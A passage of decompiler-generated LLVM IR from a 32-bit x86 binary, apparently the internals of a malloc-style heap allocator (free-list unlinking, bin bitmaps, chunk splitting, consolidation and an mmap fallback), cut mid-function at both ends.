  %stack_var_-64.1 = phi i32 [ %v2_804a424, %dec_label_pc_804a41b ], [ %v0_804a461.lcssa, %dec_label_pc_804a461 ], [ %v2_804a424, %dec_label_pc_804a438 ], [ %v3_804a416, %dec_label_pc_804a40a ]
  %v1_804a466 = urem i32 %v0_804a464, 32
  %v2_804a466 = icmp eq i32 %v1_804a466, 0
  store i32 %v1_804a466, i32* %esi.global-to-local, align 4
  store i32 %v1_804a466, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a470 = sdiv i32 %v0_804a464, 32
  store i32 %v2_804a470, i32* %edx.global-to-local, align 4
  br i1 %v2_804a466, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804a464
  %v5_804a473 = shl i32 1, %v1_804a466
  store i32 %v5_804a473, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804a464, %bb
  %v5_804a475 = phi i32 [ 1, %dec_label_pc_804a464 ], [ %v5_804a473, %bb ]
  %v1_804a475 = mul nsw i32 %v2_804a470, 4
  %v2_804a475 = add i32 %v1_804a475, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a475 = inttoptr i32 %v2_804a475 to i32*
  %v4_804a475 = load i32, i32* %v3_804a475, align 4
  %v6_804a475 = or i32 %v4_804a475, %v5_804a475
  store i32 %v6_804a475, i32* %v3_804a475, align 4
  %v0_804a47c = load i32, i32* @ebx, align 4
  %v1_804a47c = load i32, i32* @ebp, align 4
  %v2_804a47c = add i32 %v1_804a47c, 12
  %v3_804a47c = inttoptr i32 %v2_804a47c to i32*
  store i32 %v0_804a47c, i32* %v3_804a47c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804a483 = load i32, i32* @ebp, align 4
  %v2_804a483 = add i32 %v1_804a483, 8
  %v3_804a483 = inttoptr i32 %v2_804a483 to i32*
  store i32 %stack_var_-64.1, i32* %v3_804a483, align 4
  %v0_804a486 = load i32, i32* @ebp, align 4
  %v1_804a486 = load i32, i32* @ebx, align 4
  %v2_804a486 = add i32 %v1_804a486, 8
  %v3_804a486 = inttoptr i32 %v2_804a486 to i32*
  store i32 %v0_804a486, i32* %v3_804a486, align 4
  %v0_804a489 = load i32, i32* @ebp, align 4
  %v1_804a489 = load i32, i32* @esi, align 4
  %v2_804a489 = add i32 %v1_804a489, 12
  %v3_804a489 = inttoptr i32 %v2_804a489 to i32*
  store i32 %v0_804a489, i32* %v3_804a489, align 4
  %v0_804a48c = load i32, i32* @global_var_8054640.41, align 64
  store i32 %v0_804a48c, i32* @ebp, align 4
  %v9_804a492 = icmp eq i32 %v0_804a48c, 134563380
  %v1_804a498 = icmp eq i1 %v9_804a492, false
  br i1 %v1_804a498, label %dec_label_pc_804a3bb, label %dec_label_pc_804a49e

dec_label_pc_804a49e:                             ; preds = %bb84, %dec_label_pc_804a48c.preheader
  br i1 %v8_804a34f, label %dec_label_pc_804a52c, label %dec_label_pc_804a4ac

dec_label_pc_804a4ac:                             ; preds = %dec_label_pc_804a49e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804a4b0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_804a4b0 = add i32 %v1_804a4b0, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a4b0, i32* %edx.global-to-local, align 4
  %v1_804a4b7 = add i32 %v1_804a4b0, add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12)
  %v2_804a4b7 = inttoptr i32 %v1_804a4b7 to i32*
  %storemerge1.pre = load i32, i32* %v2_804a4b7, align 4
  br label %dec_label_pc_804a528

dec_label_pc_804a4bc:                             ; preds = %dec_label_pc_804a528
  %v1_804a4bc = add i32 %v4_804a4d3, 4
  %v2_804a4bc = inttoptr i32 %v1_804a4bc to i32*
  %v3_804a4bc = load i32, i32* %v2_804a4bc, align 4
  store i32 %v3_804a4bc, i32* %ebx.global-to-local, align 4
  %v1_804a4bf = add i32 %v4_804a4d3, 12
  %v2_804a4bf = inttoptr i32 %v1_804a4bf to i32*
  %v3_804a4bf = load i32, i32* %v2_804a4bf, align 4
  store i32 %v3_804a4bf, i32* @ecx, align 4
  %v1_804a4c2 = and i32 %v3_804a4bc, -4
  store i32 %v1_804a4c2, i32* @ebx, align 4
  %v10_804a4c5 = icmp ult i32 %v1_804a4c2, %v1_804a69e
  br i1 %v10_804a4c5, label %dec_label_pc_804a528, label %dec_label_pc_804a4cb

dec_label_pc_804a4cb:                             ; preds = %dec_label_pc_804a4bc
  %v1_804a4cb = add i32 %v4_804a4d3, 8
  %v2_804a4cb = inttoptr i32 %v1_804a4cb to i32*
  %v3_804a4cb = load i32, i32* %v2_804a4cb, align 4
  store i32 %v3_804a4cb, i32* @edx, align 4
  %v1_804a4ce = add i32 %v3_804a4cb, 12
  %v2_804a4ce = inttoptr i32 %v1_804a4ce to i32*
  %v3_804a4ce = load i32, i32* %v2_804a4ce, align 4
  %v15_804a4ce = icmp eq i32 %v3_804a4ce, %v4_804a4d3
  %v1_804a4d1 = icmp eq i1 %v15_804a4ce, false
  br i1 %v1_804a4d1, label %dec_label_pc_804a4d8, label %dec_label_pc_804a4d3

dec_label_pc_804a4d3:                             ; preds = %dec_label_pc_804a4cb
  %v1_804a4d3 = add i32 %v3_804a4bf, 8
  %v2_804a4d3 = inttoptr i32 %v1_804a4d3 to i32*
  %v3_804a4d3 = load i32, i32* %v2_804a4d3, align 4
  %v15_804a4d3 = icmp eq i32 %v3_804a4d3, %v4_804a4d3
  br i1 %v15_804a4d3, label %dec_label_pc_804a4dd, label %dec_label_pc_804a4d8

dec_label_pc_804a4d8:                             ; preds = %dec_label_pc_804a4d3, %dec_label_pc_804a4cb
  %v0_804a4d8 = call i32 @abort()
  store i32 %v0_804a4d8, i32* %eax.global-to-local, align 4
  %v0_804a4dd.pre = load i32, i32* @ebx, align 4
  %v0_804a4e3.pre = load i32, i32* @ecx, align 4
  %v1_804a4e3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a4dd

dec_label_pc_804a4dd:                             ; preds = %dec_label_pc_804a4d3, %dec_label_pc_804a4d8
  %v1_804a4e3 = phi i32 [ %v3_804a4cb, %dec_label_pc_804a4d3 ], [ %v1_804a4e3.pre, %dec_label_pc_804a4d8 ]
  %v0_804a4e3 = phi i32 [ %v3_804a4bf, %dec_label_pc_804a4d3 ], [ %v0_804a4e3.pre, %dec_label_pc_804a4d8 ]
  %v0_804a4dd = phi i32 [ %v1_804a4c2, %dec_label_pc_804a4d3 ], [ %v0_804a4dd.pre, %dec_label_pc_804a4d8 ]
  %v5_804a4df = sub i32 %v0_804a4dd, %v1_804a69e
  store i32 %v5_804a4df, i32* %esi.global-to-local, align 4
  %v2_804a4e3 = add i32 %v1_804a4e3, 12
  %v3_804a4e3 = inttoptr i32 %v2_804a4e3 to i32*
  store i32 %v0_804a4e3, i32* %v3_804a4e3, align 4
  %v0_804a4e6 = load i32, i32* @edx, align 4
  %v1_804a4e6 = load i32, i32* @ecx, align 4
  %v2_804a4e6 = add i32 %v1_804a4e6, 8
  %v3_804a4e6 = inttoptr i32 %v2_804a4e6 to i32*
  store i32 %v0_804a4e6, i32* %v3_804a4e6, align 4
  %v0_804a4e9 = load i32, i32* %esi.global-to-local, align 4
  %v0_804a4ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804a4ec = add i32 %v0_804a4ec, 8
  store i32 %v1_804a4ec, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804a4e9, 16
  br i1 %tmp127, label %dec_label_pc_804a9ed, label %dec_label_pc_804a4f5

dec_label_pc_804a4f5:                             ; preds = %dec_label_pc_804a4dd
  %v2_804a4f9 = add i32 %v0_804a4ec, %v1_804a69e
  store i32 %v2_804a4f9, i32* @edx, align 4
  %v1_804a4fc = or i32 %v1_804a69e, 1
  store i32 %v1_804a4fc, i32* %ebx.global-to-local, align 4
  %v2_804a4ff = add i32 %v0_804a4ec, 4
  %v3_804a4ff = inttoptr i32 %v2_804a4ff to i32*
  store i32 %v1_804a4fc, i32* %v3_804a4ff, align 4
  %v0_804a502 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a504 = or i32 %v0_804a502, 1
  store i32 %v1_804a504, i32* %eax.global-to-local, align 4
  %v0_804a507 = load i32, i32* @edx, align 4
  %v1_804a507 = load i32, i32* @ebp, align 4
  %v2_804a507 = add i32 %v1_804a507, 8
  %v3_804a507 = inttoptr i32 %v2_804a507 to i32*
  store i32 %v0_804a507, i32* %v3_804a507, align 4
  %v0_804a50a = load i32, i32* @edx, align 4
  %v1_804a50a = load i32, i32* @ebp, align 4
  %v2_804a50a = add i32 %v1_804a50a, 12
  %v3_804a50a = inttoptr i32 %v2_804a50a to i32*
  store i32 %v0_804a50a, i32* %v3_804a50a, align 4
  %v0_804a50d = load i32, i32* @edx, align 4
  %v1_804a50d = add i32 %v0_804a50d, 8
  %v2_804a50d = inttoptr i32 %v1_804a50d to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a50d, align 4
  %v0_804a514 = load i32, i32* @edx, align 4
  %v1_804a514 = add i32 %v0_804a514, 12
  %v2_804a514 = inttoptr i32 %v1_804a514 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a514, align 4
  %v0_804a51b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a51b = load i32, i32* @edx, align 4
  %v2_804a51b = add i32 %v1_804a51b, 4
  %v3_804a51b = inttoptr i32 %v2_804a51b to i32*
  store i32 %v0_804a51b, i32* %v3_804a51b, align 4
  %v0_804a51e = load i32, i32* %esi.global-to-local, align 4
  %v1_804a51e = load i32, i32* @edx, align 4
  %v3_804a51e = add i32 %v1_804a51e, %v0_804a51e
  %v4_804a51e = inttoptr i32 %v3_804a51e to i32*
  store i32 %v0_804a51e, i32* %v4_804a51e, align 4
  br label %dec_label_pc_804a9f2

dec_label_pc_804a528:                             ; preds = %dec_label_pc_804a4bc, %dec_label_pc_804a4ac
  %v4_804a4d3 = phi i32 [ %storemerge1.pre, %dec_label_pc_804a4ac ], [ %v3_804a4bf, %dec_label_pc_804a4bc ]
  store i32 %v4_804a4d3, i32* %eax.global-to-local, align 4
  %v12_804a528 = icmp eq i32 %v4_804a4d3, %v2_804a4b0
  %v1_804a52a = icmp eq i1 %v12_804a528, false
  br i1 %v1_804a52a, label %dec_label_pc_804a4bc, label %dec_label_pc_804a52c.loopexit

dec_label_pc_804a52c.loopexit:                    ; preds = %dec_label_pc_804a528
  br label %dec_label_pc_804a52c

dec_label_pc_804a52c:                             ; preds = %dec_label_pc_804a52c.loopexit, %dec_label_pc_804a49e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804a535 = add i32 %stack_var_-40.0.ph, 1
  %v2_804a538 = udiv i32 %v1_804a535, 32
  store i32 %v2_804a538, i32* @edi, align 4
  %v1_804a53b = mul i32 %v1_804a535, 8
  %v2_804a53b = add i32 %v1_804a53b, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v2_804a53b, i32* %ebx.global-to-local, align 4
  %v1_804a542 = urem i32 %v1_804a535, 32
  %v2_804a542 = icmp eq i32 %v1_804a542, 0
  store i32 %v1_804a542, i32* %ecx.global-to-local, align 4
  %v1_804a545 = mul nuw nsw i32 %v2_804a538, 4
  %v2_804a545 = add i32 %v1_804a545, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a545 = inttoptr i32 %v2_804a545 to i32*
  %v4_804a545 = load i32, i32* %v3_804a545, align 4
  store i32 %v4_804a545, i32* %edx.global-to-local, align 4
  br i1 %v2_804a542, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804a52c
  %v5_804a54c = shl i32 1, %v1_804a542
  store i32 %v5_804a54c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804a52c, %bb85, %dec_label_pc_804a58d
  %v1_804a54e = phi i32 [ %v1_804a54e.pre, %dec_label_pc_804a58d ], [ %v4_804a545, %bb85 ], [ %v4_804a545, %dec_label_pc_804a52c ]
  %v0_804a552 = phi i32 [ %v0_804a54e.pre, %dec_label_pc_804a58d ], [ %v5_804a54c, %bb85 ], [ 1, %dec_label_pc_804a52c ]
  %tmp86 = icmp ule i32 %v0_804a552, %v1_804a54e
  %v1_804a552 = icmp eq i32 %v0_804a552, 0
  %v1_804a554 = icmp eq i1 %v1_804a552, false
  %or.cond = and i1 %tmp86, %v1_804a554
  br i1 %or.cond, label %dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge, label %dec_label_pc_804a556.preheader

dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge: ; preds = %.preheader
  %v0_804a57d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a582.preheader

dec_label_pc_804a556.preheader:                   ; preds = %.preheader
  %v0_804a556.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a556

dec_label_pc_804a556:                             ; preds = %dec_label_pc_804a556.preheader, %dec_label_pc_804a560
  %v0_804a556 = phi i32 [ %v0_804a556.pre, %dec_label_pc_804a556.preheader ], [ %v1_804a556, %dec_label_pc_804a560 ]
  %v1_804a556 = add i32 %v0_804a556, 1
  store i32 %v1_804a556, i32* @edi, align 4
  %v6_804a55a = icmp ugt i32 %v1_804a556, 2
  br i1 %v6_804a55a, label %dec_label_pc_804a609.loopexit, label %dec_label_pc_804a560

dec_label_pc_804a560:                             ; preds = %dec_label_pc_804a556
  %v1_804a560 = mul i32 %v1_804a556, 4
  %v2_804a560 = add i32 %v1_804a560, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v3_804a560 = inttoptr i32 %v2_804a560 to i32*
  %v4_804a560 = load i32, i32* %v3_804a560, align 4
  store i32 %v4_804a560, i32* %edx.global-to-local, align 4
  %v1_804a567 = icmp eq i32 %v4_804a560, 0
  br i1 %v1_804a567, label %dec_label_pc_804a556, label %dec_label_pc_804a56b

dec_label_pc_804a56b:                             ; preds = %dec_label_pc_804a560
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804a572 = mul i32 %v1_804a556, 256
  store i32 %v2_804a572, i32* %eax.global-to-local, align 4
  %v1_804a575 = add i32 %v2_804a572, ptrtoint (i32* @global_var_805462c.38 to i32)
  store i32 %v1_804a575, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a582.preheader

dec_label_pc_804a582.preheader:                   ; preds = %dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge, %dec_label_pc_804a56b
  %v0_804a57d12 = phi i32 [ %v1_804a575, %dec_label_pc_804a56b ], [ %v0_804a57d12.pre, %dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804a56b ], [ %v0_804a552, %dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge ]
  %v0_804a594 = phi i32 [ %v4_804a560, %dec_label_pc_804a56b ], [ %v1_804a54e, %dec_label_pc_804a552.dec_label_pc_804a582.preheader_crit_edge ]
  %v2_804a5824 = and i32 %v0_804a594, %esi.promoted
  %v3_804a5825 = icmp eq i32 %v2_804a5824, 0
  br i1 %v3_804a5825, label %dec_label_pc_804a57d, label %dec_label_pc_804a586

dec_label_pc_804a57d:                             ; preds = %dec_label_pc_804a582.preheader, %dec_label_pc_804a57d
  %v2_804a58014 = phi i32 [ %v2_804a580, %dec_label_pc_804a57d ], [ %esi.promoted, %dec_label_pc_804a582.preheader ]
  %v0_804a57d13 = phi i32 [ %v1_804a57d, %dec_label_pc_804a57d ], [ %v0_804a57d12, %dec_label_pc_804a582.preheader ]
  %v1_804a57d = add i32 %v0_804a57d13, 8
  %v2_804a580 = mul i32 %v2_804a58014, 2
  %v2_804a582 = and i32 %v2_804a580, %v0_804a594
  %v3_804a582 = icmp eq i32 %v2_804a582, 0
  br i1 %v3_804a582, label %dec_label_pc_804a57d, label %dec_label_pc_804a582.dec_label_pc_804a586_crit_edge

dec_label_pc_804a582.dec_label_pc_804a586_crit_edge: ; preds = %dec_label_pc_804a57d
  store i32 %v1_804a57d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a580, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a586

dec_label_pc_804a586:                             ; preds = %dec_label_pc_804a582.dec_label_pc_804a586_crit_edge, %dec_label_pc_804a582.preheader
  %v0_804a596 = phi i32 [ %v2_804a580, %dec_label_pc_804a582.dec_label_pc_804a586_crit_edge ], [ %esi.promoted, %dec_label_pc_804a582.preheader ]
  %v1_804a5b0 = phi i32 [ %v1_804a57d, %dec_label_pc_804a582.dec_label_pc_804a586_crit_edge ], [ %v0_804a57d12, %dec_label_pc_804a582.preheader ]
  %v1_804a586 = add i32 %v1_804a5b0, 12
  %v2_804a586 = inttoptr i32 %v1_804a586 to i32*
  %v3_804a586 = load i32, i32* %v2_804a586, align 4
  store i32 %v3_804a586, i32* @ecx, align 4
  %v12_804a589 = icmp eq i32 %v3_804a586, %v1_804a5b0
  %v1_804a58b = icmp eq i1 %v12_804a589, false
  br i1 %v1_804a58b, label %dec_label_pc_804a5a1, label %dec_label_pc_804a58d

dec_label_pc_804a58d:                             ; preds = %dec_label_pc_804a586
  %v1_804a58f = add i32 %v3_804a586, 8
  store i32 %v1_804a58f, i32* %ebx.global-to-local, align 4
  %v1_804a592 = sub i32 -1, %v0_804a596
  store i32 %v1_804a592, i32* %eax.global-to-local, align 4
  %v2_804a594 = and i32 %v0_804a594, %v1_804a592
  store i32 %v2_804a594, i32* %edx.global-to-local, align 4
  %v2_804a596 = mul i32 %v0_804a596, 2
  store i32 %v2_804a596, i32* %esi.global-to-local, align 4
  %v1_804a598 = load i32, i32* @edi, align 4
  %v2_804a598 = mul i32 %v1_804a598, 4
  %v3_804a598 = add i32 %v2_804a598, ptrtoint (i32* @global_var_8054934.42 to i32)
  %v4_804a598 = inttoptr i32 %v3_804a598 to i32*
  store i32 %v2_804a594, i32* %v4_804a598, align 4
  %v0_804a54e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804a54e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804a5a1:                             ; preds = %dec_label_pc_804a586
  %v1_804a5a1 = add i32 %v3_804a586, 4
  %v2_804a5a1 = inttoptr i32 %v1_804a5a1 to i32*
  %v3_804a5a1 = load i32, i32* %v2_804a5a1, align 4
  store i32 %v3_804a5a1, i32* %edx.global-to-local, align 4
  %v1_804a5a4 = add i32 %v3_804a586, 12
  %v2_804a5a4 = inttoptr i32 %v1_804a5a4 to i32*
  %v3_804a5a4 = load i32, i32* %v2_804a5a4, align 4
  store i32 %v3_804a5a4, i32* %eax.global-to-local, align 4
  %v1_804a5a7 = and i32 %v3_804a5a1, -4
  store i32 %v1_804a5a7, i32* @edx, align 4
  %v5_804a5ac = sub i32 %v1_804a5a7, %v1_804a69e
  store i32 %v5_804a5ac, i32* %esi.global-to-local, align 4
  store i32 %v3_804a5a4, i32* %v2_804a586, align 4
  %v0_804a5b3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a5b3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a5b3 = add i32 %v1_804a5b3, 8
  %v3_804a5b3 = inttoptr i32 %v2_804a5b3 to i32*
  store i32 %v0_804a5b3, i32* %v3_804a5b3, align 4
  %v0_804a5b6 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804a5b6, 16
  br i1 %tmp128, label %dec_label_pc_804a5bb, label %dec_label_pc_804a5c2

dec_label_pc_804a5bb:                             ; preds = %dec_label_pc_804a5a1
  %v0_804a5bb = load i32, i32* @ecx, align 4
  %v1_804a5bb = load i32, i32* @edx, align 4
  %v2_804a5bb = add i32 %v0_804a5bb, 4
  %v3_804a5bb = add i32 %v2_804a5bb, %v1_804a5bb
  %v4_804a5bb = inttoptr i32 %v3_804a5bb to i32*
  %v5_804a5bb = load i32, i32* %v4_804a5bb, align 4
  %v6_804a5bb = or i32 %v5_804a5bb, 1
  store i32 %v6_804a5bb, i32* %v4_804a5bb, align 4
  br label %dec_label_pc_804a601

dec_label_pc_804a5c2:                             ; preds = %dec_label_pc_804a5a1
  store i32 %v1_804a69e, i32* %eax.global-to-local, align 4
  %v0_804a5cb = load i32, i32* @ecx, align 4
  %v2_804a5cb = add i32 %v0_804a5cb, %v1_804a69e
  store i32 %v2_804a5cb, i32* @edx, align 4
  %v1_804a5ce = load i32, i32* @ebp, align 4
  %v2_804a5ce = add i32 %v1_804a5ce, 8
  %v3_804a5ce = inttoptr i32 %v2_804a5ce to i32*
  store i32 %v2_804a5cb, i32* %v3_804a5ce, align 4
  %v0_804a5d1 = load i32, i32* @edx, align 4
  %v1_804a5d1 = load i32, i32* @ebp, align 4
  %v2_804a5d1 = add i32 %v1_804a5d1, 12
  %v3_804a5d1 = inttoptr i32 %v2_804a5d1 to i32*
  store i32 %v0_804a5d1, i32* %v3_804a5d1, align 4
  %v0_804a5d4 = load i32, i32* @edx, align 4
  %v1_804a5d4 = add i32 %v0_804a5d4, 8
  %v2_804a5d4 = inttoptr i32 %v1_804a5d4 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a5d4, align 4
  %v0_804a5db = load i32, i32* @edx, align 4
  %v1_804a5db = add i32 %v0_804a5db, 12
  %v2_804a5db = inttoptr i32 %v1_804a5db to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a5db, align 4
  br i1 %v6_804a357, label %dec_label_pc_804a5ea, label %dec_label_pc_804a5e4

dec_label_pc_804a5e4:                             ; preds = %dec_label_pc_804a5c2
  %v0_804a5e4 = load i32, i32* @edx, align 4
  store i32 %v0_804a5e4, i32* @global_var_8054630.39, align 16
  br label %dec_label_pc_804a5ea

dec_label_pc_804a5ea:                             ; preds = %dec_label_pc_804a5c2, %dec_label_pc_804a5e4
  %v4_804a5ea = or i32 %v1_804a69e, 1
  %v0_804a5ef = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804a5ea, i32* %ebx.global-to-local, align 4
  %v1_804a5f5 = or i32 %v0_804a5ef, 1
  store i32 %v1_804a5f5, i32* %eax.global-to-local, align 4
  %v1_804a5f8 = load i32, i32* @ecx, align 4
  %v2_804a5f8 = add i32 %v1_804a5f8, 4
  %v3_804a5f8 = inttoptr i32 %v2_804a5f8 to i32*
  store i32 %v4_804a5ea, i32* %v3_804a5f8, align 4
  %v0_804a5fb = load i32, i32* %esi.global-to-local, align 4
  %v1_804a5fb = load i32, i32* @edx, align 4
  %v3_804a5fb = add i32 %v1_804a5fb, %v0_804a5fb
  %v4_804a5fb = inttoptr i32 %v3_804a5fb to i32*
  store i32 %v0_804a5fb, i32* %v4_804a5fb, align 4
  %v0_804a5fe = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5fe = load i32, i32* @edx, align 4
  %v2_804a5fe = add i32 %v1_804a5fe, 4
  %v3_804a5fe = inttoptr i32 %v2_804a5fe to i32*
  store i32 %v0_804a5fe, i32* %v3_804a5fe, align 4
  br label %dec_label_pc_804a601

dec_label_pc_804a601:                             ; preds = %dec_label_pc_804a5bb, %dec_label_pc_804a5ea
  %v0_804a601 = load i32, i32* @ecx, align 4
  %v1_804a601 = add i32 %v0_804a601, 8
  store i32 %v1_804a601, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a609.loopexit:                    ; preds = %dec_label_pc_804a556
  br label %dec_label_pc_804a609

dec_label_pc_804a609:                             ; preds = %dec_label_pc_804a609.loopexit, %dec_label_pc_804a311, %dec_label_pc_804a319
  %v0_804a609 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a609, i32* @ebx, align 4
  %v1_804a613 = add i32 %v1_804a69e, 16
  store i32 %v1_804a613, i32* @esi, align 4
  %v1_804a616 = add i32 %v0_804a609, 4
  %v2_804a616 = inttoptr i32 %v1_804a616 to i32*
  %v3_804a616 = load i32, i32* %v2_804a616, align 4
  %v1_804a61d = and i32 %v3_804a616, -4
  store i32 %v1_804a61d, i32* %ecx.global-to-local, align 4
  %v7_804a620 = icmp ult i32 %v1_804a61d, %v1_804a613
  br i1 %v7_804a620, label %dec_label_pc_804a640, label %dec_label_pc_804a624

dec_label_pc_804a624:                             ; preds = %dec_label_pc_804a609
  %v2_804a628 = add i32 %v0_804a609, %v1_804a69e
  store i32 %v2_804a628, i32* @edx, align 4
  %v1_804a62b = or i32 %v1_804a69e, 1
  store i32 %v1_804a62b, i32* %eax.global-to-local, align 4
  store i32 %v2_804a628, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a62b, i32* %v2_804a616, align 4
  %v0_804a637 = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a637 = sub i32 %v0_804a637, %v1_804a69e
  store i32 %v5_804a637, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a993

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a609
  %v0_804a640 = load i32, i32* @global_var_805495c.43, align 4
  store i32 %v0_804a640, i32* %edx.global-to-local, align 4
  %v0_804a646 = load i8, i8* @global_var_8054600.37, align 512
  %v1_804a646 = and i8 %v0_804a646, 2
  %v2_804a646 = icmp eq i8 %v1_804a646, 0
  br i1 %v2_804a646, label %dec_label_pc_804a674, label %dec_label_pc_804a64f

dec_label_pc_804a64f:                             ; preds = %dec_label_pc_804a640
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* %stack_var_-92, align 4
  %v2_804a657 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @ebx, align 4
  %v1_804a661 = add i32 %v1_804a69e, -7
  store i32 %v1_804a661, i32* %eax.global-to-local, align 4
  store i32 %v1_804a661, i32* %stack_var_-92, align 4
  %v1_804a665 = call i32 @malloc(i32 %v1_804a661)
  store i32 %v1_804a665, i32* %eax.global-to-local, align 4
  store i32 %v1_804a665, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a674:                             ; preds = %dec_label_pc_804a640
  %v1_804a674 = add i32 %v0_804a640, -1
  store i32 %v1_804a674, i32* @ecx, align 4
  store i32 %v1_804a69e, i32* @ebx, align 4
  %v1_804a67f = load i32, i32* @global_var_805494c.44, align 4
  %v7_804a67f = icmp ult i32 %v1_804a69e, %v1_804a67f
  br i1 %v7_804a67f, label %dec_label_pc_804a741, label %dec_label_pc_804a68b

dec_label_pc_804a68b:                             ; preds = %dec_label_pc_804a674
  %v0_804a68b = load i32, i32* @global_var_8054950.45, align 16
  store i32 %v0_804a68b, i32* %eax.global-to-local, align 4
  %v1_804a690 = load i32, i32* @global_var_8054954.46, align 4
  %v5_804a696 = icmp slt i32 %v0_804a68b, %v1_804a690
  br i1 %v5_804a696, label %dec_label_pc_804a69c, label %dec_label_pc_804a741

dec_label_pc_804a69c:                             ; preds = %dec_label_pc_804a68b
  %v2_804a69e = add i32 %v1_804a69e, 10
  %v3_804a69e = add i32 %v2_804a69e, %v0_804a640
  %v1_804a6a2 = sub i32 0, %v0_804a640
  store i32 %v1_804a6a2, i32* %eax.global-to-local, align 4
  %v2_804a6a4 = and i32 %v3_804a69e, %v1_804a6a2
  store i32 %v2_804a6a4, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804a6a4, %v1_804a69e
  br i1 %tmp129, label %dec_label_pc_804a6b0, label %dec_label_pc_804a741

dec_label_pc_804a6b0:                             ; preds = %dec_label_pc_804a69c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a6bd = call i32 @mmap(i32 0, i32 %v2_804a6a4, i32 3, i32 34, i32 0, i32 0, i32 %v1_804a674, i32 %v1_804a674)
  store i32 %v8_804a6bd, i32* %eax.global-to-local, align 4
  store i32 %v8_804a6bd, i32* @edx, align 4
  %v10_804a6c7 = icmp eq i32 %v8_804a6bd, -1
  br i1 %v10_804a6c7, label %dec_label_pc_804a6b0.dec_label_pc_804a741_crit_edge, label %dec_label_pc_804a6cc

dec_label_pc_804a6b0.dec_label_pc_804a741_crit_edge: ; preds = %dec_label_pc_804a6b0
  %v0_804a741.pre = load i32, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804a741

dec_label_pc_804a6cc:                             ; preds = %dec_label_pc_804a6b0
  %v1_804a6ce = urem i32 %v8_804a6bd, 8
  %v2_804a6ce = icmp eq i32 %v1_804a6ce, 0
  store i32 %v1_804a6ce, i32* @ecx, align 4
  br i1 %v2_804a6ce, label %dec_label_pc_804a6e6, label %dec_label_pc_804a6d3

dec_label_pc_804a6d3:                             ; preds = %dec_label_pc_804a6cc
  %v0_804a6d8 = load i32, i32* @ebx, align 4
  %v2_804a6da = sub nsw i32 8, %v1_804a6ce
  store i32 %v2_804a6da, i32* %eax.global-to-local, align 4
  %v2_804a6dc = add i32 %v2_804a6da, %v8_804a6bd
  store i32 %v2_804a6dc, i32* @edx, align 4
  %v2_804a6de = sub i32 %v0_804a6d8, %v2_804a6da
  store i32 %v2_804a6de, i32* %esi.global-to-local, align 4
  %v2_804a6e0 = inttoptr i32 %v2_804a6dc to i32*
  store i32 %v2_804a6da, i32* %v2_804a6e0, align 4
  br label %dec_label_pc_804a6ee

dec_label_pc_804a6e6:                             ; preds = %dec_label_pc_804a6cc
  %v1_804a6e6 = inttoptr i32 %v8_804a6bd to i32*
  store i32 0, i32* %v1_804a6e6, align 4
  br label %dec_label_pc_804a6ee

dec_label_pc_804a6ee:                             ; preds = %dec_label_pc_804a6d3, %dec_label_pc_804a6e6
